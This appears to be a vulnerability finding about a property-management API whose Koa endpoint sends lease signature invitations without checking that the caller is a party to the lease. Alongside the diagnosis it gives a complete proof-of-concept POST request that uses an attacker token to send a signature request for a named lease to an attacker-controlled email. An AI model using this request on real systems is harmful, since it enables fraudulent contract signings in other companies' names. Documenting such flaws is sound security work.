diagnosis: The Koa endpoint accepts leaseId in URL path and dispatches an electronic signature invitation via eSignService. Although requireAuth validates the user session, it never checks whether ctx.state.user is the landlord, property owner, or assigned tenant for that lease. An unauthorized party can send fraudulent signature envelopes under other real estate companies' names.
exploit_request:
POST /real-estate/leases/lease_commercial_49102/signatures/request HTTP/1.1
Host: property.realtycloud.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"signerEmail": "fraudulent-tenant@attacker.com", "signatoryRole": "PRIMARY_TENANT"}
